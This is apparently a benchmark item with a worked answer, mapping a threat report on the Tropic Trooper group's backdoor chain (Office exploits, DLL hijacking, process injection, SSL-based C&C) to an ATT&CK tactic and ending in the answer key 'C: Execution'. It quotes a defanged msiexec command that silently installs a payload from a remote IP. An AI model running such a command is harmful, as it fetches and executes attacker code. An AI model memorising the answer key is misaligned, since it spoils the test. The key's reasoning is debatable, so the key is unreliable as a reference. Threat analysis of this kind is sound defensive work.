@@ -1,0 +1,58 @@
+### Step-by-Step Analysis
+
+#### 1. Analyze the CTI Report
+
+**Initial Access:**
+- Tropic Trooper used exploits for CVE-2017-11882 or CVE-2018-0802 to execute commands.
+- They downloaded and installed an installer package (.msi) using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.
+
+**Execution:**
+- The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) and then deleted itself.
+- UserInstall.exe dropped a normal sidebar.exe file, a malicious loader (wab32res.dll), and an encrypted configuration file.
+- UserInstall.exe used BITSadmin to create a job and launch sidebar.exe.
+- The malicious loader used DLL hijacking on sidebar.exe and launched dllhost.exe.
+- The loader injected a DLL backdoor into dllhost.exe.
+
+**Defense Evasion:**
+- DLL hijacking was used to evade antivirus detection.
+- The installer dropped files into the Apple/Update directory and created a hidden directory (UFile) to act as a ruse.
+- The loader, named FakeRun, executed dllhost.exe and injected a malicious DLL file (the backdoor) into this process.
+
+**Command and Control:**
+- TClient used SSL to connect to Tropic Trooper's C&C server.
+- The C&C server and configuration values are not hardcoded, allowing for easy updates.
+- TClient uses symmetric encryption to decrypt its configuration with a 16-byte key.
+- TClient uses custom SSL libraries to connect to the C&C server.
+
+**Others:**
+- Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware.
+- The documents use job vacancies in socio-politically sensitive organizations to lure targets.
+- The MSI file drops three files and creates a hidden directory (UFile) to act as a ruse.
+- The backdoor is loaded by a benign file (sidebar.exe) through DLL hijacking to evade AV detection.
+- TClient uses custom SSL libraries to connect to the C&C server.
+
+#### 2. Analyze the Question
+
+**Question:**
+Which ATT&CK tactic most likely occurred before the backdoor loaded the encrypted configuration file, decrypted it, and used SSL protocol to connect to C&C servers?
+
+**Answer Choices:**
+A: Command and Control
+B: Defense Evasion
+C: Execution
+D: Persistence
+
+#### 3. Compare and Evaluate
+
+- **Command and Control (A):** This tactic involves the backdoor connecting to the C&C server. However, the backdoor must first load and decrypt the configuration file before it can connect to the C&C server.
+- **Defense Evasion (B):** This tactic involves techniques to avoid detection, such as DLL hijacking. While this is a crucial part of the attack, it occurs before the backdoor is fully operational and ready to connect to the C&C server.
+- **Execution (C):** This tactic involves the initial execution of the backdoor and the loading of the encrypted configuration file. The backdoor must be executed and the configuration file loaded and decrypted before it can connect to the C&C server.
+- **Persistence (D):** This tactic involves maintaining access to the system over time. While persistence is important, it is not a prerequisite for the backdoor to load and decrypt the configuration file and connect to the C&C server.
+
+#### 4. Provide a Step-by-Step Reasoning and Final Answer
+
+- The backdoor must be executed and the encrypted configuration file loaded and decrypted before it can connect to the C&C server.
+- The execution of the backdoor and the loading of the configuration file are part of the **Execution** tactic.
+- Therefore, the most plausible sequence of TTPs is that the **Execution** tactic occurred before the backdoor loaded the encrypted configuration file, decrypted it, and used SSL protocol to connect to the C&C servers.
+
+**Final Answer: C: Execution**
